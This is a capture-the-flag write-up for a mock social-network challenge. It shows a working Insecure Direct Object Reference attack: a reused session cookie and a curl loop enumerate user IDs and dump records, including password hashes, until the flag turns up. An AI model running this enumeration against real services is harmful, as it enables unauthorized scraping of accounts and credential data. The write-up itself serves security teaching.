# 0xface: The social network for hackers

> Hey! We at 0xface are launching an awesome new platform for code artisans and rockstar hackers. Connect with other development ninjas without worrying about your privacy! Check it out!

## Write-up

When visiting the webpage linked to by the challenge, we encounter a login screen.

![Login screen](./landing_page.png)

Looking at the source code of the webpage, we discover that there is no HTML present, only a big, minified javascript file is present.
Analysing this javascript file could be a great timesink, but since the whole frontend is rendered in the browser, there must be API calls to a backend to fetch data.
We open devtools and have a look at the network inspector.

There is a "Register" button present, so we try to register a new account. 

![Register](./register.png)

After registering, we are logged in automatically.

![After registration](./register_post.png)

We see that a series of requests happen when we are logging in.
One of the more interesting requests is the one to `users.php?action=get&id=1999`. It looks like users are identified with an ID.

![User get request](./network_user_id.png)

Looking at the `friends.php?action=my_friends` request, we can confirm this suspicion by trying out some requests with their IDs.
This looks like an [Insecure Direct Object Reference](https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004\)) vulnerabilty.

We try to fetch the URL with curl.

```bash
$ curl http://0xface.writeup.ulyssis-ctf.vbgn.be/api/users.php\?action\=get\&id\=1999 -v
*   Trying 2400:cb00:2048:1::681c:1972...
* TCP_NODELAY set
* Connected to 0xface.writeup.ulyssis-ctf.vbgn.be (2400:cb00:2048:1::681c:1972) port 80 (#0)
> GET /api/users.php?action=get&id=1999 HTTP/1.1
> Host: 0xface.writeup.ulyssis-ctf.vbgn.be
> User-Agent: curl/7.52.1
> Accept: */*
>
< HTTP/1.1 403 Forbidden
< Date: Wed, 04 Apr 2018 05:13:15 GMT
< Content-Type: application/json
< Content-Length: 0
< Connection: keep-alive
< Set-Cookie: __cfduid=d29ccbe5ce00843b772f8220288b7cea11522818795; expires=Thu, 04-Apr-19 05:13:15 GMT; path=/; domain=.vbgn.be; HttpOnly
< X-Powered-By: PHP/7.2.3
< X-Content-Type-Options: nosniff
< Server: cloudflare
< CF-RAY: 406148de43012c5a-AMS
<
* Curl_http_done: called premature == 0
* Connection #0 to host 0xface.writeup.ulyssis-ctf.vbgn.be left intact
```

Our request is rejected with a `403 Forbidden` error code. Let's have a look at the cookies that are sent with the request.
Maybe there are some cookies that authenticate our user.

![Request cookies](./network_cookie.png)

Adding this cookie to our cURL request gives us the expected response.

```bash
$ curl http://0xface.writeup.ulyssis-ctf.vbgn.be/api/users.php\?action\=get\&id\=1999 -v -H "Cookie: uid=1999:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9"
*   Trying 2400:cb00:2048:1::681c:1972...
* TCP_NODELAY set
* Connected to 0xface.writeup.ulyssis-ctf.vbgn.be (2400:cb00:2048:1::681c:1972) port 80 (#0)
> GET /api/users.php?action=get&id=1999 HTTP/1.1
> Host: 0xface.writeup.ulyssis-ctf.vbgn.be
> User-Agent: curl/7.52.1
> Accept: */*
> Cookie: uid=1999:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
> 
< HTTP/1.1 200 OK
< Date: Wed, 04 Apr 2018 05:17:01 GMT
< Content-Type: application/json
< Content-Length: 171
< Connection: keep-alive
< Set-Cookie: __cfduid=d88be5d874e48ff9f3912d0cb2f5955561522819021; expires=Thu, 04-Apr-19 05:17:01 GMT; path=/; domain=.vbgn.be; HttpOnly
< X-Powered-By: PHP/7.2.3
< X-Content-Type-Options: nosniff
< Server: cloudflare
< CF-RAY: 40614e6371ef2b46-AMS
< 
* Curl_http_done: called premature == 0
* Connection #0 to host 0xface.writeup.ulyssis-ctf.vbgn.be left intact
{"id":"1999","username":"hacker","password":"e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9","roles":"ROLE_USER","is_active":"1","display_name":"hacker"}
```

Now we try to exploit the Insecure Direct Object Reference we suspected above. Since we suspect ids are assigned sequentially, the ID of our own account (1999) is the highest id that we have to try out.

```bash
$ for i in $(seq 1 1999); do curl http://0xface.writeup.ulyssis-ctf.vbgn.be/api/users.php\?action\=get\&id\=$i -H "Cookie: uid=1999:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9"; done 
{"id":"1","username":"goldenelephant841","password":"d4e89cef65fc63c6c4ee09b1d4dca9160b4f6fd5682de20e9c25c4c59199a108","roles":"ROLE_USER","is_active":"1","display_name":"Oeds Kan"}{"id":"2","username":"brownfrog850","password":"9eae35c1fd03da014b08e28a603a68662485bf76d5456f41b5752aa06b395406","roles":"ROLE_ADMIN","is_active":"1","display_name":"Neda Hooft"}{"id":"3","username":"whitepanda371","password":"a39343a3c0ee8e4ce059994410bf740ca0a67a426fac83f040657ec70a009150","roles":"ROLE_ADMIN","is_active":"1","display_name":"Ashwien Juffer"}{"id":"4","username":"heavylion190","password":"00390ba9e07843758391a78a4bf1cb57cbc67d87946ae4ee679cb9b9c07ed736","roles":"ROLE_USER","is_active":"1","display_name":"Ivor Van Oosterom"}{"id":"5","username":"purplemeercat423","password":"45e424129a47160e47a4f55de537065c4dc6dbdc51e70c71a2b53519c4f6a425","roles":"ROLE_ADMIN","is_active":"1","display_name":"Krad Kapitein"}{"id":"6","username":"blackduck800","password":"c8ce48eb6138781d2ffc5e71ad4b3d83e20d747b332d6f440988cd98c03bed34","roles":"ROLE_ADMIN","is_active":"1","display_name":"Sipke Arink"}{"id":"7","username":"brownbutterfly357","password":"b9d58d5ed36ab215f563d41e398f6bef8c5da83bbd7d1ebc227a6fe69bb75e38","roles":"ROLE_USER","is_active":"1","display_name":"Agneta Krebbers"}{"id":"8","username":"blueswan890","password":"f23504cc24ec56cae35854a794474922c6b783eb70ade4bbacd3fb515ff3eab8","roles":"ROLE_ADMIN","is_active":"1","display_name":"Miryam Polet"}{"id":"9","username":"goldenpeacock314","password":"4031f0ba89849207bdef12fab31819bb8ec3409670a0e3fa004f4bf82e191728","roles":"ROLE_ADMIN","is_active":"1","display_name":"Shemara Van Tatenhove"}{"id":"10","username":"organicostrich909","password":"9cffd014a791a6142c94315d2b02d78aafd86a12e3514f620fc9258bb5959d42","roles":"ROLE_USER","is_active":"1","display_name":"Annika Van Vessem"}{"id":"11","username":"brownfish488","password":"13cd4f433c778f785631689bdd68547dfcdc307ee6458921fd6b8c572fc1ad64","roles":"ROLE_ADMIN","is_active":"1","display_name":"Marian Van Der Kruijs"}{"id":"12","username":"tinyelephant850","password":"cba2ce93065e5b16d76913778e30e38408630cec1798c3f26cc7d4b1816851ae","roles":"ROLE_ADMIN","is_active":"1","display_name":"Fauve Van Den Boogaart"}{"id":"13","username":"beautifulswan818","password":"c219fc5dcc62f9f12d25bf625cc3670f2f8897c1adc2782db81599d47afd02f3","roles":"ROLE_USER","is_active":"1","display_name":"Nicola Van Stijn"}{"id":"14","username":"ticklishcat770","password":"15bc4a354c083d2e0add4a8337a99eaba840556f56c46b9a2a313cecd0387bb9","roles":"ROLE_ADMIN","is_active":"1","display_name":"Rodger Van Kuijk"}{"id":"15","username":"ticklishpeacock573","password":"a7dec41f0560d3d106cb1e1e19c57d6d12ed1dccb99efdbe6cdc5846b658c2fa","roles":"ROLE_ADMIN","is_active":"1","display_name":"Mendy Schreur"}{"id":"16","username":"bluelion586","password":"d3207f14373b47b13877a6dfd58eec769a524f8d0bbe0fedef9b63f7d7f5605d","roles":"ROLE_USER","is_active":"1","display_name":"Jacyntha Vlaar"}{"id":"17","username":"goldentiger269","password":"e0ad52350a0ccbe457828cfdb90a50fcfdda79d2fd1d024395a129c4b58ab96e","roles":"ROLE_ADMIN","is_active":"1","display_name":"Caleb Opdam"}{"id":"18","username":"whitemeercat476","password":"d314e0ab8f7a7da273469159c5efc2fe7905538b3862605bda96e1f8acef9578","roles":"ROLE_ADMIN","is_active":"1","display_name":"Zgr Webers"}{"id":"19","username":"smalllion358","password":"139e5083d5e1e7a07e722ebc252dbc62796eac9ce0304df787d2cc7f046dda18","roles":"ROLE_USER","is_active":"1","display_name":"Kicky Bot"}{"id":"20","username":"yellowrabbit954","password":"0717814bb84be4e8cdf7456e6300932e389cc45c949721ae04143d0758a861a9","roles":"ROLE_ADMIN","is_active":"1","display_name":"Nieck Hoogeboom"}{"id":"21","username":"goldenladybug919","password":"7926a7109f9cd01a007c10efb07d41754fad924f2ca153d949908802ae1ffa99","roles":"ROLE_USER","is_active":"1","display_name":"Annelie Ribbink"}{"id":"22","username":"silverbird135","password":"59ed5b84f9fcc84289f68ce53ff4dca331eb3858d7e1e74e18f1c4fb69f2222b","roles":"ROLE_USER","is_active":"1","display_name":"Annet Mooij"}{"id":"23","username":"heavyfish245","password":"32fb7ceec63c00fdf91d95162174836969fdd1d4692afe38a10e70cdf1ebac4a","roles":"ROLE_USER","is_active":"1","display_name":"Annamaria Derkx"}{"id":"24","username":"bigcat117","password":"85d113f81518d4d3a359fb52505fb38162747eeb552eb8fc5dd3cbd0f6c7afac","roles":"ROLE_USER","is_active":"1","display_name":"Alparslan Curvers"}{"id":"25","username":"goldenmouse569","password":"036b3795948fee91f89baec8a904f29c1499d278ebc3cd126bd3d427b5a553c5","roles":"ROLE_USER","is_active":"1","display_name":"Jarich Van Ieperen"}{"id":"26","username":"lazybutterfly616","password":"a7b410cd9f6d30fa5c951f3cfc508e2d25c028845bb722c91511e8be28cf8ae9","roles":"ROLE_USER","is_active":"1","display_name":"Loredana Reumer"}{"id":"27","username":"smallrabbit593","password":"c9a12f5a06e2e7abdf46b0dc1546ddf755ad29fb357c4abf26778c74f3383f70","roles":"ROLE_USER","is_active":"1","display_name":"Bilaal Van Rens"}{"id":"28","username":"bigswan493","password":"a63ddaef5a8168e6a5056a0b850ebc3e3553ede76671d5f6f25d88fb49a92aed","roles":"ROLE_USER","is_active":"1","display_name":"Zen Sterk"}{"id":"29","username":"lazyfish911","password":"49a99d5bf1131b2a0ac16c676b21a439ec6502b692e501ca668a81aba5f20258","roles":"ROLE_USER","is_active":"1","display_name":"Demi Klaasen"}{"id":"30","username":"redladybug408","password":"b1e5a9bcf9e3490a11dbd3f09f1ab904d758638e6bfb8aa69688ace00612bd6f","roles":"ROLE_USER","is_active":"1","display_name":"Timotheus Idrissi"}{"id":"31","username":"smallrabbit138","password":"f6fb21552ae4423c2dc2dcce51007243d31d6435e2e3a90f22271e3db9781561","roles":"ROLE_USER","is_active":"1","display_name":"Maika Okhuijsen"}{"id":"32","username":"purplesnake247","password":"93b509fac03d96622605862fd9e18766c9a1604a11e837192a838b91950af36f","roles":"ROLE_USER","is_active":"1","display_name":"Nikkie Van De Wal"}{"id":"33","username":"crazyelephant644","password":"6c76b2fb8dd407de7291229b01b9b27f412a6d250541cb4e2be74485730f8fea","roles":"ROLE_USER","is_active":"1","display_name":"Natanja Boermans"}{"id":"34","username":"smallmeercat780","password":"acdc5f67f0a9381456c53cd096f8953114aeb991db6a834b11b2390bd5e4bc6e","roles":"ROLE_USER","is_active":"1","display_name":"Sohaila Van Vuren"}{"id":"35","username":"bigcat730","password":"d05bf4de032e741357af31bf99ca7fb0c010861bb989a9af2bbe9ecf0399fa8d","roles":"ROLE_USER","is_active":"1","display_name":"Tibbe Kapteijns"}{"id":"36","username":"smallelephant249","password":"2ed837afa22f01984da244c44a25c2699ccdaad4e6d02c1752a99dbc7424f205","roles":"ROLE_USER","is_active":"1","display_name":"Jalal Bernsen"}{"id":"37","username":"orangefrog962","password":"7e14ba144c0a455009ce05780d1e53b778f27cb96dceee709cb6223a4b8271ac","roles":"ROLE_USER","is_active":"1","display_name":"Adis Van Gorkom"}{"id":"38","username":"redlion978","password":"39d4a24ec8eeb4906cda2a3ff37b92684298573f895e885daea063282ac4a540","roles":"ROLE_USER","is_active":"1","display_name":"Ceylan Velthuizen"}{"id":"39","username":"beautifulmouse401","password":"3aef4fed227837c8722742ac6dfbb19be1c8cc86b205f5e57763802c35305a27","roles":"ROLE_USER","is_active":"1","display_name":"Aaltjen Van Niekerk"}{"id":"40","username":"lazykoala456","password":"f436be09894d9fa87d62315c4d2fd2ff9443b7211770dbfbe5d836f662a568ec","roles":"ROLE_USER","is_active":"1","display_name":"Saagar Van Wijnen"}{"id":"41","username":"silverbird702","password":"f7a89eb196a57744ed2cdd8f459a1ecc757a2c51d89672bdb08b1b5d1b642494","roles":"ROLE_USER","is_active":"1","display_name":"Rifka Heskes"}{"id":"42","username":"silverduck328","password":"91f3a8365fa8faad810f90335fe657e53f94f334d812a44968fb7e63e98d7acd","roles":"ROLE_USER","is_active":"1","display_name":"Rhod Aussems"}{"id":"43","username":"bluepanda230","password":"d984d30100bb90fb97098cf6d98b714930f88912d25d8b8d4546792e47f7ddf3","roles":"ROLE_USER","is_active":"1","display_name":"July Rosa"}{"id":"44","username":"greengoose281","password":"1f4838b774bf1946b68c729a1cc9e868ee88f7c2262a266d43af27b97b3d6ebe","roles":"ROLE_USER","is_active":"1","display_name":"Berra Wigman"}{"id":"45","username":"greenpeacock959","password":"d1424fd18769ace742881ce024188297b601043819c8d53293e5225876830db1","roles":"ROLE_USER","is_active":"1","display_name":"Kaja Hilgers"}{"id":"46","username":"heavyelephant280","password":"5752dadeda34715ecc65999dc6b12472e6662acf94ddcc206c747a326f35af77","roles":"ROLE_USER","is_active":"1","display_name":"Francien Wels"}{"id":"47","username":"bluesnake702","password":"a8c1387e3b0007a49117966331559ad4298dc48d12fe2b281871de742735c922","roles":"ROLE_USER","is_active":"1","display_name":"Dianne Wormgoor"}{"id":"48","username":"purplegorilla915","password":"6be81e4b873c75a99a68460b2fde4bc24e56c623da74caad5c3e7e935064aeaa","roles":"ROLE_USER","is_active":"1","display_name":"Clemens Somsen"}{"id":"49","username":"beautifulleopard422","password":"6af570afcf9b0aeebea576b6e1698235cd863d51faace7bffd8c1c3e394afeb5","roles":"ROLE_USER","is_active":"1","display_name":"Jess Rood"}{"id":"50","username":"beautifulmeercat235","password":"5fe44c8d344b76b9f3144bbae9682a56d3ff9a4cb7e9dc3b8cfc6320a1b3b360","roles":"ROLE_USER","is_active":"1","display_name":"Chamilla Schilperoord"}{"id":"51","username":"greenfrog896","password":"45497b9d34426356755909dc214ad9d1eefe28510f47e8ce50a9139064d23127","roles":"ROLE_USER","is_active":"1","display_name":"Xavier Van Splunter"}{"id":"52","username":"blueladybug353","password":"b6c33b82b00042d97b8b0f359d7a58247c014644cc17a927b52ba3758c38859c","roles":"ROLE_USER","is_active":"1","display_name":"Renaldo Knegt"}{"id":"53","username":"organicelephant819","password":"e64001a77dbbb36c9c3419b8916fef524ea502af432d8f52226cf626debea93d","roles":"ROLE_USER","is_active":"1","display_name":"Rieuwert Drenberg"}{"id":"54","username":"bigswan930","password":"0dadc6cd33f7749ddcb78e5d5b16f2cee4947ec2fd9ae14bff8e11f92f97f376","roles":"ROLE_USER","is_active":"1","display_name":"Howard Dubbelaar"}{"id":"55","username":"orangemouse963","password":"02d8c55c2fc7329750d584242ddb72eb7ea7849ac46f3ec151e14d2dabbae3d2","roles":"ROLE_USER","is_active":"1","display_name":"Yun Lammerse"}{"id":"56","username":"bigdog702","password":"9809be3adc57943f13da508e84e033188011d3cfeabd1de451b538c368c202c7","roles":"ROLE_USER","is_active":"1","display_name":"Richmond Hubert"}{"id":"57","username":"greenrabbit593","password":"f79c7ceb069d47a295cfa628ea817955a7717ce5cde49769ebc4e2cb9132c4dc","roles":"ROLE_USER","is_active":"1","display_name":"Lune Van Oijen"}{"id":"58","username":"beautifulmeercat518","password":"8abb889cd60bcc64b994da6927417dc036d155b38918382eb39000d5f36b8a5b","roles":"ROLE_USER","is_active":"1","display_name":"Hai Alkemade"}{"id":"59","username":"silverkoala859","password":"ae321d25973936b16357b600bfeaace1381a08369302c3f8a0236fcc1a802945","roles":"ROLE_USER","is_active":"1","display_name":"Junaid Van Hassel"}{"id":"60","username":"bluecat639","password":"aaad0547f93f515892b446c49d5022a4a1479e8edd821390218eb130862ceeec","roles":"ROLE_USER","is_active":"1","display_name":"Fatiha Kreukniet"}{"id":"61","username":"redladybug913","password":"714c56db9ac7be2d493cc5ea9a34760d2d0044c9dca319447c0c1bb822911835","roles":"ROLE_USER","is_active":"1","display_name":"Anique Van Den Ouden"}{"id":"62","username":"bluefrog126","password":"15e569991ac3d30c5e75da6bd00ade3d14551a307c84e3300df12e1a75cfaaf4","roles":"ROLE_USER","is_active":"1","display_name":"Jella Van De Wardt"}{"id":"63","username":"crazycat284","password":"20753f8f6d8493608c89491b4cf38ece33bca4a07b433044a6352ea2da0c8015","roles":"ROLE_USER","is_active":"1","display_name":"Wolfgang Van Eijndhoven"}{"id":"64","username":"goldenleopard580","password":"6e0b889260e1f5c0df0ec1ae434caa2bc463c3550715ee4b437b368fdfe532c5","roles":"ROLE_USER","is_active":"1","display_name":"Cherique Dobbelsteen"}{"id":"65","username":"silvertiger156","password":"1520a57b3c0f2ffb4c09474ce00d529882cdf835a79a0f119916d6b15265eef4","roles":"ROLE_USER","is_active":"1","display_name":"Tugay Collignon"}{"id":"66","username":"smallleopard553","password":"406db3f795efc5269c2dcd250416e9d3de4ebe88cd46063344bf1270f493fafc","roles":"ROLE_USER","is_active":"1","display_name":"Lobna Kleijweg"}^C
```

We quickly find out that it is not useful to print all user data we have fetched from the application, as sifting through this data would take a large amount of time.

We decide to search through the output of curl for `FLG`, as that is the flag indicator used by this CTF.

```bash
$ for i in $(seq 1 1999); do curl http://0xface.writeup.ulyssis-ctf.vbgn.be/api/users.php\?action\=get\&id\=$i -H "Cookie: uid=1999:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9" 2>/dev/null | grep "FLG" ; done
{"id":"1833","username":"brownpanda424","password":"{FLG:Gy3RMDPbYZg2aXNDqKCCvbwGSLFHLSvjsW4kV86i69kb}","roles":"ROLE_ADMIN","is_active":"1","display_name":"Jard Waterman"}
```

We have found the flag.
